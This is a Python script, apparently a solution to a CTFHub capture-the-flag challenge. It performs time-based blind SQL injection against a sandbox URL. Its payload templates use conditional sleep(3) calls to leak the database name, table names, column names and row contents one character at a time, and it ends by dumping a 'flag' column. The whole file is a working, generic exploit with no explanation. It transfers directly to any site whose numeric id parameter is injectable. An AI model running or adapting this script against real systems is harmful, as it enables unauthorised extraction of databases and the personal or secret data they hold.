import requests,time

url='http://challenge-b809a1815ce6a2f0.sandbox.ctfhub.com:10080/?id={}'

# ---------设置payload（默认数字型注入）---------
Get_db_payload="1 and if(ascii(substring(database(),{},1))={},sleep(3),1) --+"
Get_table_payload="1 and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit {},{}),{},1))={},sleep(3),1) --+"
Get_columns_payload="1 and if(ascii(substring((select column_name from information_schema.columns where table_schema=database() and table_name='{}' limit {},{}),{},1))={},sleep(3),1) --+"
Get_dump_payload="1 and if(ascii(substring((select {} from {} limit {},{}),{},1))={},sleep(3),1) --+"
# ----------------------------------------------

# ---------设置返回正确页面提示，和header--------
if_data='query_success'
key=['{','}', '@', '_',',','a','b','c','d','e','f','j','h','i','g','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','G','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9']
headers={}
# ----------------------------------------------


def Get_db():
    db_text,num,_='',1,""
    while 1:
        for i in key:
            _=db_text   #temp变量相当于记录上一轮的值，如果判断和这轮相等，那么就return，这样就不用获取数据库长度了。
            payload=Get_db_payload.format(num,ord(i))
            start_time=time.time()
            requests.get(url.format(payload))
            stop_time=time.time()
            if stop_time-start_time>2:
                db_text+=i
                num+=1
                break
        if db_text==_:
            return db_text
        print('[+]out:'+db_text)


def Get_table():
    tables=[]
    for num_biao in range(1,9999999):
        tables.append('')
        last=''
        for ranking_biao in range(1,99999999):
            for i in key:
                last=tables[num_biao-1]
                payload=Get_table_payload.format(num_biao-1,num_biao,ranking_biao,ord(i))
                start_time=time.time()
                requests.get(url.format(payload))
                stop_time=time.time()
                if stop_time-start_time>2:
                    tables[num_biao-1]+=i
                    break
            if last==tables[num_biao-1]:
                break
        if tables[num_biao-1]=='':
            tables.pop()
            return tables
        print('[+]out:'+tables[num_biao-1])


def Get_columns(table):
    columns=[]
    for columns_num in range(1,999999):
        columns.append('')
        last=''
        for columns_ranking in range(1,999999):
            for i in key:
                last=columns[columns_num-1]
                payload=Get_columns_payload.format(table,columns_num-1,1,columns_ranking,ord(i))
                st=time.time()
                requests.get(url.format(payload))
                stt=time.time()
                if stt-st>2:
                    columns[columns_num-1]+=i
                    break
            if last==columns[columns_num-1]:
                break
        print(columns)
        if columns[columns_num-1]=='':
            columns.pop()
            return columns
        print('[+]out:'+columns[columns_num-1])


def Get_dump(column,table):
    data=[]
    for i in range(1,999999):
        data.append('')
        temp=''
        for j in range(1,999999):
            for k in key:
                temp=data[i-1]
                payload=Get_dump_payload.format(column,table,i-1,1,j,ord(k))
                s=time.time()
                requests.get(url.format(payload))
                t=time.time()
                if t-s>2:
                    data[i-1]+=k
                    break
            if temp==data[i-1]:
                break
            print(data[i-1])
        if data[i-1]=='':
            data.pop()
            return data
        print("[+]out:"+data[i-1])


if __name__ == "__main__":
    Get_dump('flag','flag')

